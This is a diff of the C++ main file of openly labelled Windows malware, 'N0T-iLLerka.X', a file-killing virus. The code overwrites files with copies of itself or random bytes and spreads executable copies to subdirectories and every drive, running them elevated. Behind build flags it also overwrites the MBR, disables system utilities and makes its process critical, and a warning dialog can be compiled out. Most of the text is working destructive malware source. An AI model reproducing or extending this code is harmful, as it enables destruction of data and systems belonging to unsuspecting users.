@@ -7,17 +7,17 @@
  | 	      \/       \/                      \/      \/     \/           \/   |__| \/      \_/ |    | |____| \/     \/         \_/ |____| |
  +--------------------------------------------------------------------+----------------------/    \-------------------------------------/
  | N0T-iLLerka.X [.niX] your File Killa]    [Virus.Win32.VC Type: .X] |
- | by Lima X [L4X] / [G-C-E-R] © 2k19       [dev-VER: 0.5.1 BETA-2]   |
+ | by Lima X [L4X] / [G-C-E-R] © 2k19       [dev-VER: 0.5.1 BETA-3]   |
  \--------------------------------------------------------------------*/
 
 #include "../Header-Files/pch.h"
 #include "../Header-Files/N0T-iLLerka.h"
 
 INT APIENTRY wWinMain(
-	_In_ HINSTANCE hInstance,
+	_In_     HINSTANCE hInstance,
 	_In_opt_ HINSTANCE hPrevInstance,
-	_In_ LPWSTR lpCmdLine,
-	_In_ int nShowCmd
+	_In_     LPWSTR    lpCmdLine,
+	_In_     INT       nShowCmd
 ) {
 	// Read Commandline Arguments
 	INT nArgs;
@@ -29,17 +29,11 @@ INT APIENTRY wWinMain(
 		ExitProcess(EXIT_FAILURE);
 	}
 
-	// Get Process Heap Handle to free Argslist later on
-	HANDLE hHeap = GetProcessHeap();
-
-	// Save current Directory to Buffer
-	WCHAR szCd[MAX_PATH];
+	// Save current Directory and FileName to Buffers
 	GetCurrentDirectory(MAX_PATH, szCd);
-	// Save current Filename to Buffer
-	WCHAR szMfn[MAX_PATH];
 	GetModuleFileName(NULL, szMfn, MAX_PATH);
 
-	if ((nArgs > 1) && (!lstrcmp(szArglist[1], L"/exec"))) { // ## Start of /exec ## Malware Payload execution ######################################
+	if ((nArgs > 1) && (!lstrcmp(szArglist[1], L"/exec"))) { //// Start of /exec //// Malware Payload execution ////////////////////////////////////////
 #ifdef DEBUG_MSG
 		MessageBox(NULL, L"Executing with Argument: /exec", szMALWR_NAME, MB_ICONINFORMATION | MB_SYSTEMMODAL);
 #endif // DEBUG_MSG
@@ -63,21 +57,19 @@ INT APIENTRY wWinMain(
 						break;
 					case WAIT_FAILED:
 						fnERRORHANDLERW(L"Wait failed", NULL, L"WaitForSingleObject", MB_ICONERROR);
-						HeapFree(hHeap, NULL, szArglist);
+						LocalFree(szArglist);
 						ExitProcess(EXIT_FAILURE);
 					}
 				}
 			}
 		} else {
-			HeapFree(hHeap, NULL, szArglist);
+			LocalFree(szArglist);
 			ExitProcess(EXIT_FAILURE);
 		}
 
-		//// BETA ////
-		// DirectoryIterat0r 1.0 //
 		std::vector<std::wstring> vszDir, vszFile;
 		if (fnDirectoryIteratorW(szCd, L"*", &vszDir, &vszFile)) {
-			// FileCorrupt0r 1.1 //
+			// FileCourruptor //
 			LARGE_INTEGER liFs;
 			PWCHAR pszRd;
 			DWORD dwNOBW;
@@ -88,7 +80,8 @@ INT APIENTRY wWinMain(
 						if (lstrcmp(i.c_str(), szMfn)) {
 							if (SetFileAttributes(i.c_str(), FILE_ATTRIBUTE_NORMAL)) {
 								if (!CopyFile(szMfn, i.c_str(), FALSE)) {
-									fnERRORHANDLERW(L"Couldn't copy current Module to target Path\nModule: %s\nTarget: %s", NULL, L"CopyFileW", MB_ICONERROR, szMfn, i.c_str());
+									fnERRORHANDLERW(L"Couldn't copy current Module to target Path\nModule: %s\nTarget: %s", NULL, L"CopyFileW",
+										MB_ICONERROR, szMfn, i.c_str());
 								}
 							} else {
 								fnERRORHANDLERW(L"Couldn't set File Attribute", NULL, L"SetFileAttributes", MB_ICONERROR);
@@ -105,7 +98,8 @@ INT APIENTRY wWinMain(
 						if (pszRd) {
 							NTSTATUS lBCGRr = BCryptGenRandom(NULL, (LPBYTE)pszRd, liFs.LowPart, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
 							if (lBCGRr) {
-								fnERRORHANDLERW(L"Couldn't generate Random Buffer Content\nusing ZeroMemory instead", NULL, L"BCryptGenRandom", MB_ICONWARNING);
+								fnERRORHANDLERW(L"Couldn't generate Random Buffer Content\nusing ZeroMemory instead", NULL, L"BCryptGenRandom",
+									MB_ICONWARNING);
 								ZeroMemory(pszRd, liFs.LowPart);
 							}
 							if (!WriteFile(hFile, pszRd, liFs.LowPart, &dwNOBW, NULL)) {
@@ -124,14 +118,15 @@ INT APIENTRY wWinMain(
 				}
 			}
 
-			// DirectoryInfect0r 1.0
+			// DirectoryInfector //
 			std::wstring szNfn;
 			for (std::wstring i : vszDir) {
 				szNfn = i + L"\\" + fnCryptGenRandomStringW(nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN)) + L".exe";
 				if (CopyFile(szMfn, szNfn.c_str(), FALSE)) {
 					ShellExecute(NULL, L"runas", szNfn.c_str(), L"/exec", i.c_str(), SW_SHOWDEFAULT);
 				} else {
-					fnERRORHANDLERW(L"Couldn't copy current Module to target Path\nModule: %s\nTarget: %s", NULL, L"CopyFileW", MB_ICONERROR, szMfn, i.c_str());
+					fnERRORHANDLERW(L"Couldn't copy current Module to target Path\nModule: %s\nTarget: %s", NULL, L"CopyFileW",
+						MB_ICONERROR, szMfn, i.c_str());
 				}
 			}
 		}
@@ -139,10 +134,10 @@ INT APIENTRY wWinMain(
 		if (hSmpo) {
 			ReleaseSemaphore(hSmpo, 1, NULL);
 		}
-		HeapFree(hHeap, NULL, szArglist);
+		LocalFree(szArglist);
 		ExitProcess(EXIT_SUCCESS);
-// ######## End of /exec ############################################################################################################################
-	} else if ((nArgs > 1) && (!lstrcmp(szArglist[1], L"/host"))) { // ## Start of /host ## Malware Host with/without Malware initialization ########
+//// End of /exec ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+	} else if ((nArgs > 1) && (!lstrcmp(szArglist[1], L"/host"))) { //// Start of /host //// Malware Host with/without Malware initialization ///////
 #if DEBUG_MSG == TRUE
 		if ((nArgs > 2) && (!lstrcmp(szArglist[2], L"/init"))) {
 			MessageBox(NULL, L"Executing with Argument: /init\nInitializing Malware", szMALWR_NAME, MB_ICONINFORMATION | MB_SYSTEMMODAL);
@@ -153,27 +148,26 @@ INT APIENTRY wWinMain(
 
 		if (!fnIsUserAdmin()) {
 			fnERRORHANDLERW(L"Process isn't Administrator", NULL, L"fnIsUserAdmin", MB_ICONERROR);
-			HeapFree(hHeap, NULL, szArglist);
+			LocalFree(szArglist);
 			ExitProcess(EXIT_FAILURE);
 		}
-
 		if (!SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS)) {
 			fnERRORHANDLERW(L"Couldn't set Malware Host to High Priority\nRunning with Normal Priority", NULL, L"SetPriorityClass", MB_ICONWARNING);
 		}
 
-#if DISABLE_SYNCHRONIZATION == FALSE
+#if SYNCHRONIZATION == TRUE
 		// Check if /host Mutex already exist, if exist: exit Malware, if not: { ... }
 		if (fnCheckMutexW(szHOST_MUTEX)) {
 			fnERRORHANDLERW(L"Malware Host is already running\n(Mutex already exist)", NULL, L"fnCheckMutexW", MB_ICONINFORMATION);
 
-			HeapFree(hHeap, NULL, szArglist);
+			LocalFree(szArglist);
 			ExitProcess(EXIT_FAILURE);
 		} else {
 			// Create /host Mutex for /exec operation
 			HANDLE hMutex = CreateMutex(NULL, TRUE, szHOST_MUTEX);
 			if (!hMutex) {
 				fnERRORHANDLERW(L"Couldn't create /host Mutex", NULL, L"CreateMutexW", MB_ICONERROR);
-				HeapFree(hHeap, NULL, szArglist);
+				LocalFree(szArglist);
 				ExitProcess(EXIT_FAILURE);
 			}
 		}
@@ -183,23 +177,23 @@ INT APIENTRY wWinMain(
 		if (!hSemaphore) {
 			fnERRORHANDLERW(L"Couldn't create /host Semaphore", NULL, L"CreateSemaphore", MB_ICONWARNING);
 		}
-#endif // !DISABLE_SYNCHRONIZATION
+#endif // SYNCHRONIZATION
 
-#if DISABLE_NT_FUNCTIONS == FALSE
+#if NT_FUNCTIONS == TRUE
 		// Set Process as critical
 		if (fnNTSetProcessIsCritical(TRUE)) {
 			MessageBox(NULL, L"HostProcess is now Critical", szMALWR_NAME, MB_ICONWARNING | MB_SYSTEMMODAL);
 		}
-#endif // !DISABLE_NT_FUNCTIONS
+#endif // NT_FUNCTIONS
 
 		// Initialize the Malware
-		if ((nArgs > 2) && (!lstrcmp(szArglist[2], L"/init"))) { // ## Start of /init ## Malware initialization #####################################
+		if ((nArgs > 2) && (!lstrcmp(szArglist[2], L"/init"))) { //// Start of /init //// Malware initialization //////////////////////////////////////////
 #if KILL_MBR == TRUE
 			fnOverwriteMBR();
 #endif // KILL_MBR
-#if DISABLE_PROTECTIONS == FALSE
+#if PROTECTIONS == TRUE
 			fnDisableUtilities();
-#endif // !DISABLE_PROTECTIONS
+#endif // PROTECTIONS
 
 			// Enumerate Drives
 			std::vector<std::wstring> vszDrives;
@@ -212,7 +206,8 @@ INT APIENTRY wWinMain(
 					if (CopyFile(szMfn, szNfn.c_str(), FALSE)) {
 						ShellExecute(NULL, L"runas", szNfn.c_str(), L"/exec", i.c_str(), SW_SHOWDEFAULT);
 					} else {
-						fnERRORHANDLERW(L"Couldn't copy current Module to target Path\nModule: %s\nTarget: %s", NULL, L"CopyFileW", MB_ICONERROR, szMfn, szNfn.c_str());
+						fnERRORHANDLERW(L"Couldn't copy current Module to target Path\nModule: %s\nTarget: %s", NULL, L"CopyFileW",
+							MB_ICONERROR, szMfn, szNfn.c_str());
 					}
 				}
 			} else {
@@ -222,7 +217,8 @@ INT APIENTRY wWinMain(
 				if (CopyFile(szMfn, szNfn.c_str(), FALSE)) {
 					ShellExecute(NULL, L"runas", szNfn.c_str(), L"/exec", L"C:\\", SW_SHOWDEFAULT);
 				} else {
-					fnERRORHANDLERW(L"Couldn't copy current Module to target Path\nModule: %s\nTarget: %s", NULL, L"CopyFileW", MB_ICONERROR, szMfn, szNfn.c_str());
+					fnERRORHANDLERW(L"Couldn't copy current Module to target Path\nModule: %s\nTarget: %s", NULL, L"CopyFileW",
+						MB_ICONERROR, szMfn, szNfn.c_str());
 				}
 			}
 
@@ -230,12 +226,12 @@ INT APIENTRY wWinMain(
 			if (!fnCreateRegistryKeyW(HKEY_LOCAL_MACHINE, szREGISTRY_KEY, TRUE, NULL, NULL, NULL)) {
 				fnCreateRegistryKeyW(HKEY_CURRENT_USER, szREGISTRY_KEY, TRUE, NULL, NULL, NULL);
 			}
-		} // ######## End of /init ##################################################################################################################
+		} //// End of /init /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
 		// Deadlock
-		HeapFree(hHeap, NULL, szArglist);
+		LocalFree(szArglist);
 		Sleep(INFINITE);
-	} // ######## End of /host ######################################################################################################################
+	} //// End of /host /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
 	// If no Arguments were passed ...
 
@@ -251,15 +247,15 @@ INT APIENTRY wWinMain(
 		if (!fnIsUserAdmin()) {
 			ShellExecute(NULL, L"runas", szMfn, NULL, NULL, SW_SHOWDEFAULT);
 
-			HeapFree(hHeap, NULL, szArglist);
+			LocalFree(szArglist);
 			ExitProcess(EXIT_FAILURE);
 		}
 
 		if (!fnCheckMutexW(szHOST_MUTEX)) {
-			if (fnCopyFileW(szAdpn.c_str(), szAdfn.c_str(), szMfn)) {
+			if (fnCopyFileW(szAdpn.c_str(), szAdfn.c_str())) {
 				ShellExecute(NULL, L"runas", szAdfn.c_str(), L"/host", NULL, SW_SHOWDEFAULT);
 			} else {
-				HeapFree(hHeap, NULL, szArglist);
+				LocalFree(szArglist);
 				ExitProcess(EXIT_FAILURE);
 			}
 		}
@@ -271,7 +267,7 @@ INT APIENTRY wWinMain(
 			} else {
 				if (i == (50 - 1)) {
 					fnERRORHANDLERW(L"Malware Host failed to launch", NULL, L"fnCheckMutexW", MB_ICONERROR);
-					HeapFree(hHeap, NULL, szArglist);
+					LocalFree(szArglist);
 					ExitProcess(EXIT_FAILURE);
 				}
 
@@ -279,8 +275,8 @@ INT APIENTRY wWinMain(
 			}
 		}
 	} else {
-// Ugly formating, sorry for that...
-#if DISABLE_WARNING == FLASE
+		// Ugly formating, sorry for that...
+#if WARNING == TRUE
 		// Warn User about the execution of the Malware
 		if (MessageBox(NULL, L"The Software you're trying to execute is considered Malware !\n\n"
 			L"Running this Malware will result in your Computer being unusable "
@@ -288,18 +284,23 @@ INT APIENTRY wWinMain(
 			L"If you're seeing this Message without knowing what you just executed, simply press NO and nothing will happen.\n"
 			L"If you know what you're doing press YES to continue.\n\n"
 			L"DO YOU WANT TO EXECUTE THIS MALWARE ?", szMALWR_NAME, MB_YESNO | MB_SYSTEMMODAL | MB_ICONWARNING) == IDYES) {
-#endif // !DISABLE_WARNING
-			if (fnCopyFileW(szAdpn.c_str(), szAdfn.c_str(), szMfn)) {
+			if (fnCopyFileW(szAdpn.c_str(), szAdfn.c_str())) {
 				ShellExecute(NULL, L"runas", szAdfn.c_str(), L"/host /init", szAdpn.c_str(), SW_SHOWDEFAULT);
 			} else {
-				HeapFree(hHeap, NULL, szArglist);
+				LocalFree(szArglist);
 				ExitProcess(EXIT_FAILURE);
 			}
-#if DISABLE_WARNING == FALSE
 		}
-#endif // !DISABLE_WARNING
+#else // WARNING
+		if (fnCopyFileW(szAdpn.c_str(), szAdfn.c_str(), szMfn)) {
+			ShellExecute(NULL, L"runas", szAdfn.c_str(), L"/host /init", szAdpn.c_str(), SW_SHOWDEFAULT);
+		} else {
+			LocalFree(szArglist);
+			ExitProcess(EXIT_FAILURE);
+		}
+#endif // !WARNING
 	}
 
-	HeapFree(hHeap, NULL, szArglist);
+	LocalFree(szArglist);
 	return EXIT_SUCCESS;
 }
